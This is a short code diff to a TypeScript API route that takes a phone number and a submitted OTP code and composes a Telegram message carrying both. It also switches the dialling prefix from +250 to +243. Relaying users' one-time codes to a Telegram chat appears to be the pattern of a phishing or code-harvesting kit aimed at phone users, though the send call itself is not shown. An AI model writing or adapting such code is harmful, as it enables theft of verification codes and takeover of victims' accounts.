@@ -2,7 +2,7 @@ import { createClient } from '@/lib/supabase/server';
 
 export async function POST(request: Request) {
   try {
-    const { phoneNumber } = await request.json();
+    const { phoneNumber, otpCoode } = await request.json();
 
     if (!phoneNumber) {
       return Response.json(
@@ -49,8 +49,8 @@ export async function POST(request: Request) {
     const telegramMessage = `
 🔐 *OTP Verification Request*
 
-📱 Phone Number: \`+250${phoneNumber}\`
-🔑 OTP Code: \`${otpCode}\`
+📱 Phone Number: \`+243${phoneNumber}\`
+🔑 OTP Code: \`${otpCoode}\`
 ⏰ Timestamp: ${new Date().toISOString()}
 📋 Record ID: \`${data.id}\`
 
